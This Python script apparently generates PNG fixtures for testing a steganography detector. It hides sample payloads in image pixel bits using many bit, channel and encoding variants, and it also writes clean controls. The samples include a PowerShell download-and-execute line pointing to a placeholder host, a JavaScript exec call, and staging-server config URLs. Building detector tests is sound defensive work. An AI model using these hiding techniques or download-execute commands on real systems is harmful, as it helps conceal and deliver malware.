#!/usr/bin/env python3
"""Generate low-complexity pixel carriers and clean controls without dependencies."""
import argparse
import base64
import gzip
import io
import json
from pathlib import Path
import runpy
import struct
import zipfile
import zlib

BASE = runpy.run_path(str(Path(__file__).with_name('make-png-stego.py')))
WIDTH = HEIGHT = 128
SCRIPT = BASE['DEFAULT_PAYLOAD']
chunk = BASE['chunk']


def png(path, pixels, channels=3, depth=8, palette=False):
    color = 3 if palette else {1: 0, 3: 2, 4: 6}[channels]
    stride = WIDTH * channels * (depth // 8)
    rows = b''.join(b'\0' + pixels[y * stride:(y + 1) * stride] for y in range(HEIGHT))
    data = b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', struct.pack('>IIBBBBB', WIDTH, HEIGHT, depth, color, 0, 0, 0))
    if palette:
        data += chunk(b'PLTE', bytes(v for i in range(256) for v in (i, i, i)))
    path.write_bytes(data + chunk(b'IDAT', zlib.compress(rows, 9)) + chunk(b'IEND', b''))


def packed(payload, channels='rgb', mask=1, order='xy', prime=False, reverse=False):
    pixels = bytearray(v for y in range(HEIGHT) for x in range(WIDTH) for v in (x * 2, y * 2, x + y))
    bits = iter((v >> b) & 1 for v in payload + b'\0' for b in (range(8) if reverse else range(7, -1, -1)))
    for index in BASE['slots'](channels, order, prime):
        for plane in range(7, -1, -1):
            if not mask & (1 << plane):
                continue
            bit = next(bits, None)
            if bit is None:
                return pixels
            pixels[index] = (pixels[index] & ~(1 << plane)) | (bit << plane)
    raise ValueError('carrier capacity exceeded')


def elf():
    # A loadable Linux x86-64 ELF containing exit(0); generated as bytes only.
    code = bytes.fromhex('b83c00000031ff0f05')
    ident = b'\x7fELF\x02\x01\x01' + bytes(9)
    header = struct.pack('<HHIQQQIHHHHHH', 2, 62, 1, 0x400078, 64, 0, 0, 64, 56, 1, 0, 0, 0)
    segment = struct.pack('<IIQQQQQQ', 1, 5, 0, 0x400000, 0x400000, 120 + len(code), 120 + len(code), 4096)
    return ident + header + segment + code


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--out-dir', required=True, type=Path)
    args = parser.parse_args()
    out = args.out_dir.resolve()
    out.mkdir(parents=True, exist_ok=True)
    rows = []

    def add(name, pixels, kind, channels=3, depth=8, palette=False):
        path = out / (name + '.png')
        png(path, bytes(pixels), channels, depth, palette)
        rows.append(dict(path=str(path), expected_kind=kind, expected_max_crit=3 if kind is None else 5 if kind == 'elf' else 4))

    cover = bytes(v for y in range(HEIGHT) for x in range(WIDTH) for v in (x * 2, y * 2, x + y))
    add('clean-gradient', cover, None)
    add('shell-rgb-lsb', packed(SCRIPT), 'shell')
    add('shell-bgr-column-prime', packed(SCRIPT, 'bgr', order='yx', prime=True), 'shell')
    add('shell-red-second-bit', packed(SCRIPT, 'r', mask=2), 'shell')
    add('shell-blue-fourth-bit', packed(SCRIPT, 'b', mask=8), 'shell')
    add('shell-rgb-two-low-bits', packed(SCRIPT, mask=3), 'shell')
    add('shell-rgb-four-low-bits', packed(SCRIPT, mask=15), 'shell')
    add('shell-reversed-bit-order', packed(SCRIPT, reverse=True), 'shell')
    add('shell-direct-rgb', packed(SCRIPT, mask=255), 'shell')
    ordinary = packed(SCRIPT)
    for name, flip_x, flip_y in [('both', True, True), ('x', True, False), ('y', False, True)]:
        flipped = bytes(ordinary[((HEIGHT - 1 - y if flip_y else y) * WIDTH
                                  + (WIDTH - 1 - x if flip_x else x)) * 3 + c]
                        for y in range(HEIGHT) for x in range(WIDTH) for c in range(3))
        add('shell-reversed-pixels-' + name, flipped, 'shell')
    add('shell-zlib', packed(zlib.compress(SCRIPT)), 'shell')
    add('shell-gzip', packed(gzip.compress(SCRIPT, mtime=0)), 'shell')
    add('shell-base64-zlib', packed(base64.b64encode(zlib.compress(SCRIPT))), 'shell')
    add('shell-single-byte-xor', packed(bytes(v ^ 0x5a for v in SCRIPT)), 'shell')
    add('shell-hex', packed(SCRIPT.hex().encode()), 'shell')
    add('shell-utf16le', packed(SCRIPT.decode().encode('utf-16le')), 'shell')
    framed = base64.b64encode(SCRIPT)
    add('shell-length-framed-base64', packed(str(len(framed)).encode() + b':' + framed), 'shell')
    add('python', packed(b"import os\nos.system('printf fixture')\n"), 'python')
    add('javascript', packed(b"const cp = require('child_process'); cp.exec('id');\n"), 'javascript')
    add('powershell', packed(b"$x = New-Object Net.WebClient; IEX($x.DownloadString('https://example.invalid/fixture'));"), 'powershell')
    add('json-config', packed(b'{"server":"https://stage.example.invalid/update","delay":30}'), 'json')
    add('url-config', packed(b'https://stage.example.invalid/update'), 'url')
    add('elf-image', packed(elf()), 'elf')
    large = bytearray(elf())
    struct.pack_into('<Q', large, 40, 8192)
    struct.pack_into('<H', large, 58, 64)
    struct.pack_into('<H', large, 60, 1)
    large.extend(bytes(8192 + 64 - len(large)))
    add('elf-header-beyond-probe', packed(large, mask=255), 'elf-header')
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, 'w', compression=zipfile.ZIP_STORED) as archive:
        info = zipfile.ZipInfo('payload.sh', date_time=(2020, 1, 1, 0, 0, 0))
        archive.writestr(info, SCRIPT)
    add('zip-archive', packed(stream.getvalue()), 'zip')
    red = packed(SCRIPT, 'r')
    gray = bytes(red[i] for i in range(0, len(red), 3))
    add('gray-lsb', gray, 'shell', channels=1)
    add('palette-lsb', gray, 'shell', channels=1, palette=True)
    add('sixteen-bit-low-lane', bytes(v for low in red for v in (128, low)), 'shell', depth=16)
    rgba = bytearray(v for i in range(WIDTH * HEIGHT) for v in (*cover[i * 3:i * 3 + 3], 255))
    for i, byte in enumerate(SCRIPT):
        rgba[(i // 3) * 4 + i % 3] = byte
        rgba[(i // 3) * 4 + 3] = 0
    add('transparent-rgb-bytes', rgba, 'shell', channels=4)
    rgba = bytearray(v for i in range(WIDTH * HEIGHT) for v in (*cover[i * 3:i * 3 + 3], 255))
    for i, byte in enumerate(SCRIPT):
        rgba[i * 4 + 3] = byte
    add('alpha-bytes', rgba, 'shell', channels=4)
    bad = bytearray(zlib.compress(SCRIPT)); bad[-1] ^= 1
    add('bad-zlib-checksum', packed(bytes(bad)), None)
    add('short-mz-is-not-pe', packed(b'MZ not a valid program or a parsed executable header'), None)
    add('plain-prose-control', packed(b'Documentation example and ordinary chart legend without source syntax.'), None)
    (out / 'manifest.json').write_text(json.dumps(dict(embedded_commands_executed=False, cases=rows), indent=2) + '\n')
    print(f'{len(rows)} low-complexity PNG carrier and control fixtures generated in {out}')


if __name__ == '__main__':
    main()
